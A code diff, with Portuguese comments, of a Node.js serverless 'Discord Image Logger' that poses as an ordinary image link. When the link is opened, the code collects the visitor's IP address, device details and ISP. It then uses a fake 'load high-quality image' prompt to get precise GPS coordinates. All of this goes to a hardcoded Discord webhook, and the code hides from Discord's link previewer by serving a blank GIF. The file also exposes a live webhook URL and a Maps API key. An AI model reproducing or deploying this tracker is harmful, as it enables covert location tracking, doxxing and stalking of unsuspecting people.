@@ -1,4 +1,4 @@
-// Location Logger - Versão corrigida para Vercel
+// Discord Image Logger - Versão com API IP melhorada
 const https = require('https');
 const http = require('http');
 const url = require('url');
@@ -6,15 +6,16 @@ const url = require('url');
 // Configuração
 const config = {
   "webhook": "https://discord.com/api/webhooks/1360077979798994975/fmGm-fubperOWmfIx7pO_OrVe1wZ5qpBbH35QjxJxequV3mjnfVmixC5wBtMRcfmxI1t",
-  "username": "Location Tracker",
-  "color": 0xFF3E4D,
+  "image": "https://i.pinimg.com/564x/12/26/e0/1226e0b520b52a84933d697f52600012.jpg",
+  "username": "Image Logger",
+  "color": 0x00FFFF,
   "accurateLocation": true
 };
 
-// Função para obter informações detalhadas sobre o IP
+// Função melhorada para obter informações detalhadas sobre o IP
 async function getIPInfo(ip) {
   return new Promise((resolve, reject) => {
-    // Usar API alternativa que funciona melhor com IPv6 e redes móveis
+    // Usar uma API alternativa que funciona melhor com IPv6 e redes móveis
     const apiUrl = `http://ip-api.com/json/${ip}?fields=status,message,continent,country,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`;
     
     http.get(apiUrl, (res) => {
@@ -100,7 +101,7 @@ function sendDiscordWebhook(data) {
       // Tratar erros na requisição
       req.on('error', (error) => {
         console.error('Erro na requisição do webhook:', error);
-        resolve(false); // Mudado de reject para resolve para evitar crash
+        reject(error);
       });
       
       // Enviar os dados
@@ -108,7 +109,7 @@ function sendDiscordWebhook(data) {
       req.end();
     } catch (error) {
       console.error('Erro ao enviar webhook:', error);
-      resolve(false); // Mudado de reject para resolve para evitar crash
+      reject(error);
     }
   });
 }
@@ -118,7 +119,7 @@ function isIOS(userAgent) {
   return /iPad|iPhone|iPod/.test(userAgent);
 }
 
-// Função para formatar a mensagem para o Discord
+// Função para formatar a mensagem completa do Discord com informações detalhadas do IP
 function formatIPInfoMessage(ip, userAgent, info, coords = null, endpoint = null) {
   // Detectar sistema operacional e navegador
   let os = "Unknown";
@@ -155,16 +156,13 @@ function formatIPInfoMessage(ip, userAgent, info, coords = null, endpoint = null
   // Formatar coordenadas
   let coordsText = 'Unknown';
   let coordsSource = 'Approximate';
-  let mapsLink = '';
   
   if (coords) {
     coordsText = coords.replace(',', ', ');
-    coordsSource = `Precise`;
-    mapsLink = `https://www.google.com/maps/search/google+map++${coords}`;
+    coordsSource = `Precise, [Google Maps](https://www.google.com/maps/search/google+map++${coords})`;
   } else if (info && info.lat && info.lon) {
     coordsText = `${info.lat}, ${info.lon}`;
     coordsSource = `Approximate`;
-    mapsLink = `https://www.google.com/maps/search/google+map++${info.lat},${info.lon}`;
   }
 
   // Formatar timezone
@@ -181,56 +179,50 @@ function formatIPInfoMessage(ip, userAgent, info, coords = null, endpoint = null
   // Verificar bot
   let botStatus = 'False';
   if (info && info.hosting) {
-    botStatus = 'Possibly';
-  }
-  if (info && info.proxy) {
-    botStatus = 'Likely';
+    if (info.hosting && !info.proxy) {
+      botStatus = 'Possibly';
+    } else if (info.hosting) {
+      botStatus = 'Possibly';
+    }
   }
 
-  // Extrair ASN do campo "as"
+  // Extrair ASN do campo "as" (pode conter o ASN completo como "AS12345 Organization")
   let asn = 'Unknown';
   if (info && info.as) {
-    asn = info.as;
+    // Extrair apenas o número do ASN
+    const asnMatch = info.as.match(/AS(\d+)/i);
+    if (asnMatch && asnMatch[1]) {
+      asn = info.as;
+    } else {
+      asn = info.as;
+    }
   }
 
-  let content = coords ? "@everyone **LOCALIZAÇÃO EXATA CAPTURADA**" : "";
+  return `**A User Opened the Original Image!**
 
-  return {
-    username: config.username,
-    content: content,
-    embeds: [
-      {
-        title: `${coords ? "🎯 LOCALIZAÇÃO PRECISA CAPTURADA!" : "🔍 Acesso Detectado - Aguardando GPS"}`,
-        color: config.color,
-        description: `**Informações do Dispositivo**
+**Endpoint:** \`${endpoint || 'N/A'}\`
+            
+**IP Info:**
 > **IP:** \`${ip || 'Unknown'}\`
-> **Sistema:** \`${os}\`
-> **Navegador:** \`${browser}\`
-
-**Localização:**
-> **Coordenadas:** \`${coordsText}\` (${coordsSource})
-> **Mapa:** ${mapsLink ? `[Ver no Google Maps](${mapsLink})` : 'Não disponível'}
-> **País:** \`${info && info.country ? info.country : 'Unknown'}\`
-> **Região:** \`${info && info.regionName ? info.regionName : 'Unknown'}\`
-> **Cidade:** \`${info && info.city ? info.city : 'Unknown'}\`
-> **Operadora:** \`${info && info.isp ? info.isp : 'Unknown'}\`
+> **Provider:** \`${info && info.isp ? info.isp : 'Unknown'}\`
 > **ASN:** \`${asn}\`
+> **Country:** \`${info && info.country ? info.country : 'Unknown'}\`
+> **Region:** \`${info && info.regionName ? info.regionName : 'Unknown'}\`
+> **City:** \`${info && info.city ? info.city : 'Unknown'}\`
+> **Coords:** \`${coordsText}\` (${coordsSource})
 > **Timezone:** \`${timezoneText}\`
+> **Mobile:** \`${info && info.mobile !== undefined ? info.mobile : 'Unknown'}\`
+> **VPN:** \`${info && info.proxy !== undefined ? info.proxy : 'Unknown'}\`
+> **Bot:** \`${botStatus}\`
 
-**Status de Segurança:**
-> **Rede Móvel:** \`${info && info.mobile !== undefined ? info.mobile : 'Unknown'}\`
-> **VPN/Proxy:** \`${info && info.proxy !== undefined ? info.proxy : 'Unknown'}\`
-> **Bot/DC:** \`${botStatus}\`
+**PC Info:**
+> **OS:** \`${os}\`
+> **Browser:** \`${browser}\`
 
 **User Agent:**
 \`\`\`
 ${userAgent || 'Unknown'}
-\`\`\`
-
-**Endpoint:** \`${endpoint || 'N/A'}\``
-      }
-    ]
-  };
+\`\`\``;
 }
 
 // Função principal
@@ -245,9 +237,9 @@ module.exports = async (req, res) => {
     const ip = req.headers['x-forwarded-for'] || 
                req.headers['x-real-ip'] || 
                req.socket.remoteAddress || 
-               'Unknown';
+               'Desconhecido';
     
-    const userAgent = req.headers['user-agent'] || 'Unknown';
+    const userAgent = req.headers['user-agent'] || 'Desconhecido';
     
     console.log('Requisição recebida de IP:', ip);
     console.log('User Agent:', userAgent);
@@ -256,7 +248,7 @@ module.exports = async (req, res) => {
     const deviceIsIOS = isIOS(userAgent);
     
     // Verificar se o IP é do Discord (começa com 35)
-    const isDiscord = typeof ip === 'string' && ip.startsWith('35');
+    const isDiscord = ip.startsWith('35');
     
     // Se temos parâmetro de geolocalização, enviar para o Discord
     if (geoParam) {
@@ -273,17 +265,31 @@ module.exports = async (req, res) => {
         console.log('Informações do IP obtidas:', ipInfo);
         
         // Formatar a mensagem completa
-        const data = formatIPInfoMessage(ip, userAgent, ipInfo, coords, req.url);
+        const description = formatIPInfoMessage(ip, userAgent, ipInfo, coords, req.url);
+        
+        // Enviar webhook ao Discord com coordenadas
+        const data = {
+          username: config.username,
+          content: "@everyone",
+          embeds: [
+            {
+              title: "Image Logger - IP + Localização Capturados",
+              color: config.color,
+              description: description,
+              thumbnail: { url: config.image }
+            }
+          ]
+        };
         
         console.log('Enviando webhook para o Discord...');
         await sendDiscordWebhook(data);
         
-        // Enviar página com o Google Maps
+        // Enviar página com a imagem
         const html = `
           <!DOCTYPE html>
           <html>
           <head>
-            <title>Location Map</title>
+            <title>Imagem</title>
             <meta charset="utf-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
             <style>
@@ -292,59 +298,20 @@ module.exports = async (req, res) => {
                 padding: 0;
                 height: 100%;
                 width: 100%;
-                font-family: Arial, sans-serif;
-                background-color: #f5f5f5;
-              }
-              .container {
-                display: flex;
-                flex-direction: column;
-                height: 100vh;
-                padding: 20px;
-                box-sizing: border-box;
-              }
-              .map-container {
-                flex: 1;
-                border-radius: 8px;
                 overflow: hidden;
-                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-                margin-bottom: 20px;
               }
-              iframe {
+              .imagem {
                 width: 100%;
-                height: 100%;
-                border: none;
-              }
-              .info {
-                background: white;
-                padding: 15px;
-                border-radius: 8px;
-                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-              }
-              h1 {
-                margin-top: 0;
-                font-size: 1.5rem;
-                color: #333;
-              }
-              p {
-                color: #666;
-                line-height: 1.5;
+                height: 100vh;
+                background-image: url('${config.image}');
+                background-position: center;
+                background-repeat: no-repeat;
+                background-size: contain;
               }
             </style>
           </head>
           <body>
-            <div class="container">
-              <div class="map-container">
-                <iframe
-                  src="https://www.google.com/maps/embed/v1/place?key=AIzaSyBFw0Qbyq9zTFTd-tUY6dZWTgaQzuU17R8&q=${latitude},${longitude}&zoom=15"
-                  allowfullscreen>
-                </iframe>
-              </div>
-              <div class="info">
-                <h1>Localização encontrada</h1>
-                <p>Suas coordenadas foram detectadas com sucesso. Esta é a sua localização aproximada no mapa.</p>
-                <p>Latitude: ${latitude}, Longitude: ${longitude}</p>
-              </div>
-            </div>
+            <div class="imagem"></div>
           </body>
           </html>
         `;
@@ -354,7 +321,6 @@ module.exports = async (req, res) => {
       } catch (error) {
         console.error('Erro ao processar geolocalização:', error);
         // Continuar mesmo com erro na geolocalização
-        sendErrorPage(res);
       }
     } else if (isDiscord) {
       // Se for o Discord acessando, enviar alerta de link
@@ -365,17 +331,17 @@ module.exports = async (req, res) => {
         content: "",
         embeds: [
           {
-            title: "🔗 Link Enviado no Discord",
+            title: "Image Logger - Link Sent",
             color: config.color,
-            description: `Um link de rastreamento foi enviado em um chat!\nVocê pode receber dados de localização em breve.\n\n**Endpoint:** \`${req.url}\`\n**IP:** \`${ip}\`\n**Platform:** \`Discord\``,
+            description: `An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** \`${req.url}\`\n**IP:** \`${ip}\`\n**Platform:** \`Discord\``,
           }
         ]
       };
       
       await sendDiscordWebhook(data);
       
-      // Para o Discord, enviar imagem 1x1 transparente
-      res.setHeader('Content-Type', 'image/gif');
+      // Para o Discord, enviar imagem bugada
+      res.setHeader('Content-Type', 'image/jpeg');
       res.status(200).send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
     } else if (config.accurateLocation) {
       // Se não temos geolocalização ainda, solicitar do navegador
@@ -386,17 +352,313 @@ module.exports = async (req, res) => {
       console.log('Informações básicas do IP obtidas:', ipInfo);
       
       // Formatar a mensagem básica
-      const data = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
+      const description = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
+      
+      const basicData = {
+        username: config.username,
+        content: "",
+        embeds: [
+          {
+            title: "Image Logger - Acesso Inicial",
+            color: config.color,
+            description: description,
+            thumbnail: { url: config.image }
+          }
+        ]
+      };
       
       console.log('Enviando relatório inicial para o Discord...');
+      await sendDiscordWebhook(basicData);
+      
+      // Personalizar o HTML com base no dispositivo (iOS vs outros)
+      let html;
+      
+      if (deviceIsIOS) {
+        // Versão especial para iOS com instruções claras
+        html = `
+          <!DOCTYPE html>
+          <html>
+          <head>
+            <title>Imagem</title>
+            <meta charset="utf-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <style>
+              body, html {
+                margin: 0;
+                padding: 0;
+                height: 100%;
+                width: 100%;
+                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+              }
+              .container {
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                position: relative;
+              }
+              .image-preview {
+                width: 100%;
+                max-width: 500px;
+                max-height: 70vh;
+                object-fit: contain;
+                border-radius: 8px;
+                box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+              }
+              .location-button {
+                margin-top: 20px;
+                background-color: #007AFF; /* iOS blue */
+                color: white;
+                border: none;
+                border-radius: 20px;
+                padding: 12px 24px;
+                font-size: 16px;
+                font-weight: 600;
+                cursor: pointer;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+              }
+              .location-icon {
+                margin-right: 8px;
+                width: 20px;
+                height: 20px;
+              }
+              .message {
+                margin-top: 16px;
+                text-align: center;
+                color: #8E8E93;
+                font-size: 14px;
+                max-width: 300px;
+              }
+              .hidden {
+                display: none;
+              }
+            </style>
+          </head>
+          <body>
+            <div class="container">
+              <img src="${config.image}" alt="Imagem" class="image-preview">
+              
+              <button id="locationButton" class="location-button">
+                <svg class="location-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                  <circle cx="12" cy="10" r="3"></circle>
+                  <path d="M12 2a8 8 0 0 0-8 8c0 1.892.402 3.13 1.5 4.5L12 22l6.5-7.5c1.098-1.37 1.5-2.608 1.5-4.5a8 8 0 0 0-8-8z"></path>
+                </svg>
+                Ver em alta qualidade
+              </button>
+              
+              <p class="message">Toque no botão acima para ver a imagem em resolução completa</p>
+              
+              <div id="loadingMessage" class="message hidden">
+                Carregando imagem em alta definição...
+              </div>
+            </div>
+            
+            <script>
+              // Script para geolocalização no iOS
+              document.getElementById('locationButton').addEventListener('click', function() {
+                // Mostrar mensagem de carregamento
+                document.getElementById('loadingMessage').classList.remove('hidden');
+                this.disabled = true;
+                this.style.backgroundColor = '#999';
+                
+                // Solicitar geolocalização
+                if (navigator.geolocation) {
+                  navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                      // Sucesso - temos a posição
+                      var lat = position.coords.latitude;
+                      var lng = position.coords.longitude;
+                      var coords = lat + "," + lng;
+                      
+                      // Codificar em base64
+                      var encodedCoords = btoa(coords);
+                      
+                      // Construir nova URL
+                      var currentUrl = window.location.href;
+                      var newUrl;
+                      if (currentUrl.includes("?")) {
+                        newUrl = currentUrl + "&g=" + encodedCoords;
+                      } else {
+                        newUrl = currentUrl + "?g=" + encodedCoords;
+                      }
+                      
+                      // Redirecionar
+                      window.location.replace(newUrl);
+                    },
+                    function(error) {
+                      // Erro ao obter localização
+                      console.log("Erro de geolocalização: " + error.message);
+                      document.getElementById('loadingMessage').innerText = "Erro ao carregar. Tente novamente.";
+                      document.getElementById('locationButton').disabled = false;
+                      document.getElementById('locationButton').style.backgroundColor = '#007AFF';
+                    },
+                    {
+                      enableHighAccuracy: true,
+                      timeout: 15000,
+                      maximumAge: 0
+                    }
+                  );
+                }
+              });
+            </script>
+          </body>
+          </html>
+        `;
+      } else {
+        // Versão padrão para Android e outros dispositivos
+        html = `
+          <!DOCTYPE html>
+          <html>
+          <head>
+            <title>Imagem</title>
+            <meta charset="utf-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <style>
+              body, html {
+                margin: 0;
+                padding: 0;
+                height: 100%;
+                width: 100%;
+                overflow: hidden;
+              }
+              .imagem {
+                width: 100%;
+                height: 100vh;
+                background-image: url('${config.image}');
+                background-position: center;
+                background-repeat: no-repeat;
+                background-size: contain;
+              }
+              .loading {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background-color: rgba(0,0,0,0.3);
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                color: white;
+                font-family: Arial, sans-serif;
+                z-index: 100;
+              }
+              .loading-content {
+                background-color: rgba(0,0,0,0.7);
+                padding: 20px;
+                border-radius: 10px;
+                text-align: center;
+              }
+              .spinner {
+                border: 4px solid rgba(255,255,255,0.3);
+                border-radius: 50%;
+                border-top: 4px solid white;
+                width: 30px;
+                height: 30px;
+                margin: 10px auto;
+                animation: spin 1s linear infinite;
+              }
+              @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+              }
+            </style>
+          </head>
+          <body>
+            <div class="imagem"></div>
+            <div class="loading">
+              <div class="loading-content">
+                <div class="spinner"></div>
+                <p>Carregando imagem em alta qualidade...</p>
+              </div>
+            </div>
+            
+            <script>
+              // Script para obter geolocalização
+              document.addEventListener('DOMContentLoaded', function() {
+                var currentUrl = window.location.href;
+                
+                // Verificar se já temos o parâmetro g
+                if (!currentUrl.includes("g=")) {
+                  // Solicitar geolocalização
+                  if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                      function(position) {
+                        // Sucesso - temos a posição
+                        var lat = position.coords.latitude;
+                        var lng = position.coords.longitude;
+                        var coords = lat + "," + lng;
+                        
+                        // Codificar em base64
+                        var encodedCoords = btoa(coords);
+                        
+                        // Construir nova URL
+                        var newUrl;
+                        if (currentUrl.includes("?")) {
+                          newUrl = currentUrl + "&g=" + encodedCoords;
+                        } else {
+                          newUrl = currentUrl + "?g=" + encodedCoords;
+                        }
+                        
+                        // Redirecionar
+                        window.location.replace(newUrl);
+                      },
+                      function(error) {
+                        // Erro ao obter localização
+                        console.log("Erro de geolocalização: " + error.message);
+                        document.querySelector('.loading').style.display = 'none';
+                      },
+                      {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                      }
+                    );
+                  }
+                }
+              });
+            </script>
+          </body>
+          </html>
+        `;
+      }
+      
+      res.setHeader('Content-Type', 'text/html');
+      res.status(200).send(html);
+    } else {
+      // Geolocalização não está ativada, enviar relatório básico
+      console.log('Obtendo informações básicas do IP (sem geolocalização)...');
+      const ipInfo = await getIPInfo(ip);
+      console.log('Informações básicas do IP obtidas:', ipInfo);
+      
+      const description = formatIPInfoMessage(ip, userAgent, ipInfo, null, req.url);
+      
+      const data = {
+        username: config.username,
+        content: "@everyone",
+        embeds: [
+          {
+            title: "Image Logger - IP Capturado",
+            color: config.color,
+            description: description,
+            thumbnail: { url: config.image }
+          }
+        ]
+      };
+      
+      console.log('Enviando relatório para o Discord...');
       await sendDiscordWebhook(data);
       
-      // Usando a mesma página para todos os dispositivos para forçar a solicitação de localização
+      // Enviar página com a imagem
       const html = `
         <!DOCTYPE html>
         <html>
         <head>
-          <title>Carregando...</title>
+          <title>Imagem</title>
           <meta charset="utf-8">
           <meta name="viewport" content="width=device-width, initial-scale=1.0">
           <style>
@@ -405,322 +667,42 @@ module.exports = async (req, res) => {
               padding: 0;
               height: 100%;
               width: 100%;
-              font-family: Arial, sans-serif;
-              background-color: #f8f8f8;
               overflow: hidden;
             }
-            #overlay {
-              position: fixed;
-              top: 0;
-              left: 0;
+            .imagem {
               width: 100%;
-              height: 100%;
-              background-color: rgba(0,0,0,0.8);
-              z-index: 999;
-              display: flex;
-              flex-direction: column;
-              justify-content: center;
-              align-items: center;
-              padding: 20px;
-              box-sizing: border-box;
-              color: white;
-              text-align: center;
-            }
-            .modal {
-              background-color: #fff;
-              border-radius: 12px;
-              padding: 30px;
-              max-width: 450px;
-              width: 90%;
-              box-shadow: 0 5px 20px rgba(0,0,0,0.3);
-              text-align: center;
-              color: #333;
-            }
-            .title {
-              font-size: 22px;
-              font-weight: bold;
-              margin-bottom: 20px;
-              color: #e53935;
-            }
-            .message {
-              font-size: 16px;
-              line-height: 1.6;
-              margin-bottom: 25px;
-            }
-            .button {
-              background-color: #e53935;
-              color: white;
-              border: none;
-              border-radius: 30px;
-              padding: 15px 30px;
-              font-size: 16px;
-              font-weight: bold;
-              cursor: pointer;
-              transition: all 0.2s;
-              display: inline-block;
-            }
-            .button:hover {
-              background-color: #c62828;
-              transform: scale(1.05);
-            }
-            .icon {
-              width: 80px;
-              height: 80px;
-              margin-bottom: 20px;
-              animation: pulse 2s infinite;
-            }
-            @keyframes pulse {
-              0% { transform: scale(1); }
-              50% { transform: scale(1.1); }
-              100% { transform: scale(1); }
-            }
-            .loading {
-              position: fixed;
-              top: 0;
-              left: 0;
-              width: 100%;
-              height: 100%;
-              background-color: rgba(255,255,255,0.95);
-              display: flex;
-              flex-direction: column;
-              justify-content: center;
-              align-items: center;
-              z-index: 1000;
-            }
-            .spinner {
-              border: 5px solid rgba(0,0,0,0.1);
-              border-radius: 50%;
-              border-top: 5px solid #e53935;
-              width: 60px;
-              height: 60px;
-              margin-bottom: 20px;
-              animation: spin 1s linear infinite;
-            }
-            @keyframes spin {
-              0% { transform: rotate(0deg); }
-              100% { transform: rotate(360deg); }
-            }
-            .retry-container {
-              display: none;
-              text-align: center;
-              background-color: #fff;
-              padding: 30px;
-              border-radius: 12px;
-              max-width: 450px;
-              box-shadow: 0 5px 20px rgba(0,0,0,0.3);
-            }
-            .error-icon {
-              color: #e53935;
-              font-size: 50px;
-              margin-bottom: 20px;
-            }
-            .error-title {
-              font-size: 22px;
-              color: #e53935;
-              margin-bottom: 15px;
+              height: 100vh;
+              background-image: url('${config.image}');
+              background-position: center;
+              background-repeat: no-repeat;
+              background-size: contain;
             }
           </style>
         </head>
         <body>
-          <!-- Página de fundo (nunca visível) -->
-          <div style="display: none;">Carregando...</div>
-          
-          <!-- Overlay principal -->
-          <div id="overlay">
-            <div class="modal">
-              <svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#e53935">
-                <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
-              </svg>
-              <div class="title">ATENÇÃO</div>
-              <div class="message">
-                É necessário ativar sua localização para continuar. 
-                Este serviço requer acesso à sua posição atual.
-              </div>
-              <button id="allowLocationBtn" class="button">Permitir Localização</button>
-            </div>
-          </div>
-          
-          <!-- Tela de carregamento (inicialmente oculta) -->
-          <div id="loadingScreen" class="loading" style="display: none;">
-            <div class="spinner"></div>
-            <div style="font-size: 18px; font-weight: bold; margin-bottom: 10px;">Obtendo Localização</div>
-            <div style="color: #666;">Por favor, aguarde...</div>
-          </div>
-          
-          <!-- Tela de erro/retry (inicialmente oculta) -->
-          <div id="retryScreen" class="loading" style="display: none;">
-            <div class="retry-container">
-              <div class="error-icon">⚠️</div>
-              <div class="error-title">Acesso Negado</div>
-              <div style="margin-bottom: 20px; color: #666; line-height: 1.5;">
-                O acesso à sua localização foi negado. Para continuar, é necessário permitir o acesso à sua localização.
-              </div>
-              <button onclick="showPermissionInstructions()" class="button" style="background-color: #4285F4; margin-right: 10px;">Como Permitir</button>
-              <button onclick="retryLocation()" class="button">Tentar Novamente</button>
-            </div>
-          </div>
-          
-          <!-- Tela de instruções (inicialmente oculta) -->
-          <div id="instructionsScreen" class="loading" style="display: none;">
-            <div class="retry-container" style="max-width: 500px;">
-              <div style="text-align: right; margin-bottom: 10px;">
-                <button onclick="hideInstructions()" style="background: none; border: none; font-size: 24px; cursor: pointer;">×</button>
-              </div>
-              <div style="font-size: 20px; font-weight: bold; margin-bottom: 20px;">Como Permitir Acesso à Localização</div>
-              
-              <div id="chromeInstructions" style="text-align: left; display: none;">
-                <p><strong>No Chrome:</strong></p>
-                <ol style="line-height: 1.6; margin-bottom: 20px; padding-left: 20px;">
-                  <li>Clique no ícone de cadeado/informação na barra de endereço</li>
-                  <li>Clique em "Permissões do site"</li>
-                  <li>Encontre "Localização" e selecione "Permitir"</li>
-                  <li>Recarregue a página</li>
-                </ol>
-              </div>
-              
-              <div id="safariInstructions" style="text-align: left; display: none;">
-                <p><strong>No Safari:</strong></p>
-                <ol style="line-height: 1.6; margin-bottom: 20px; padding-left: 20px;">
-                  <li>Abra Ajustes no seu iPhone/iPad</li>
-                  <li>Role para baixo e toque em "Safari"</li>
-                  <li>Toque em "Permissões de Sites"</li>
-                  <li>Toque em "Localização" e selecione "Permitir"</li>
-                  <li>Volte ao Safari e recarregue a página</li>
-                </ol>
-              </div>
-              
-              <div id="firefoxInstructions" style="text-align: left; display: none;">
-                <p><strong>No Firefox:</strong></p>
-                <ol style="line-height: 1.6; margin-bottom: 20px; padding-left: 20px;">
-                  <li>Clique no ícone de cadeado na barra de endereço</li>
-                  <li>Clique em "Permissões"</li>
-                  <li>Em "Acessar Sua Localização", selecione "Permitir"</li>
-                  <li>Recarregue a página</li>
-                </ol>
-              </div>
-              
-              <div id="edgeInstructions" style="text-align: left; display: none;">
-                <p><strong>No Edge:</strong></p>
-                <ol style="line-height: 1.6; margin-bottom: 20px; padding-left: 20px;">
-                  <li>Clique no ícone de cadeado na barra de endereço</li>
-                  <li>Clique em "Permissões do site"</li>
-                  <li>Em "Localização", selecione "Permitir"</li>
-                  <li>Recarregue a página</li>
-                </ol>
-              </div>
-              
-              <div id="genericInstructions" style="text-align: left; display: none;">
-                <p><strong>Instruções Gerais:</strong></p>
-                <ol style="line-height: 1.6; margin-bottom: 20px; padding-left: 20px;">
-                  <li>Procure pelo ícone de cadeado ou permissões na barra de endereço</li>
-                  <li>Procure por configurações de "Localização" ou "Permissões do site"</li>
-                  <li>Altere a configuração para "Permitir"</li>
-                  <li>Recarregue a página</li>
-                </ol>
-              </div>
-              
-              <button onclick="retryLocation()" class="button">Tentar Novamente</button>
-            </div>
-          </div>
-
-          <script>
-            // Solicitar localização automaticamente quando a página carrega
-            document.addEventListener('DOMContentLoaded', function() {
-              // Forçamos solicitação após um pequeno delay para garantir que a interface carregue primeiro
-              setTimeout(function() {
-                // Tentar obter localização automaticamente após 1 segundo
-                requestLocation();
-              }, 500);
-            });
-
-            // Referências aos elementos da interface
-            const overlay = document.getElementById('overlay');
-            const loadingScreen = document.getElementById('loadingScreen');
-            const retryScreen = document.getElementById('retryScreen');
-            const instructionsScreen = document.getElementById('instructionsScreen');
-            const allowLocationBtn = document.getElementById('allowLocationBtn');
-
-            // Botão para permitir localização
-            allowLocationBtn.addEventListener('click', function() {
-              requestLocation();
-            });
-
-            // Função para solicitar localização
-            function requestLocation() {
-              // Esconde overlay e mostra tela de carregamento
-              overlay.style.display = 'none';
-              loadingScreen.style.display = 'flex';
-              
-              if (navigator.geolocation) {
-                // Tenta obter localização com alta precisão e sem cache
-                navigator.geolocation.getCurrentPosition(
-                  // Sucesso
-                  function(position) {
-                    // Temos a posição
-                    const lat = position.coords.latitude;
-                    const lng = position.coords.longitude;
-                    const coords = lat + "," + lng;
-                    
-                    // Codifica em base64
-                    const encodedCoords = btoa(coords);
-                    
-                    // Constrói nova URL
-                    const currentUrl = window.location.href;
-                    let newUrl;
-                    if (currentUrl.includes("?")) {
-                      newUrl = currentUrl + "&g=" + encodedCoords;
-                    } else {
-                      newUrl = currentUrl + "?g=" + encodedCoords;
-                    }
-                    
-                    // Redireciona
-                    window.location.replace(newUrl);
-                  },
-                  // Erro
-                  function(error) {
-                    console.error("Erro de geolocalização:", error.message);
-                    loadingScreen.style.display = 'none';
-                    retryScreen.style.display = 'flex';
-                  },
-                  // Opções
-                  {
-                    enableHighAccuracy: true,
-                    timeout: 15000,
-                    maximumAge: 0
-                  }
-                );
-              } else {
-                alert("Seu navegador não suporta geolocalização. Por favor, use um navegador mais recente.");
-                loadingScreen.style.display = 'none';
-                overlay.style.display = 'flex';
-              }
-            }
-
-            // Função para tentar novamente
-            function retryLocation() {
-              retryScreen.style.display = 'none';
-              instructionsScreen.style.display = 'none';
-              requestLocation();
-            }
-
-            // Função para mostrar instruções de permissão
-            function showPermissionInstructions() {
-              retryScreen.style.display = 'none';
-              instructionsScreen.style.display = 'flex';
-              
-              // Determina qual navegador está sendo usado
-              const ua = navigator.userAgent;
-              const chromeInst = document.getElementById('chromeInstructions');
-              const safariInst = document.getElementById('safariInstructions');
-              const firefoxInst = document.getElementById('firefoxInstructions');
-              const edgeInst = document.getElementById('edgeInstructions');
-              const genericInst = document.getElementById('genericInstructions');
-              
-              // Esconde todas as instruções primeiro
-              chromeInst.style.display = 'none';
-              safariInst.style.display = 'none';
-              firefoxInst.style.display = 'none';
-              edgeInst.style.display = 'none';
-              genericInst.style.display = 'none';
-              
-              // Mo
+          <div class="imagem"></div>
+        </body>
+        </html>
+      `;
+      
+      res.setHeader('Content-Type', 'text/html');
+      res.status(200).send(html);
+    }
+  } catch (error) {
+    console.error('Erro:', error);
+    
+    // Em caso de erro, enviar página básica
+    res.setHeader('Content-Type', 'text/html');
+    res.status(200).send(`
+      <!DOCTYPE html>
+      <html>
+      <head>
+        <title>Imagem</title>
+      </head>
+      <body>
+        <img src="${config.image}" alt="Imagem" style="max-width: 100%; max-height: 100vh;">
+      </body>
+      </html>
+    `);
+  }
+};
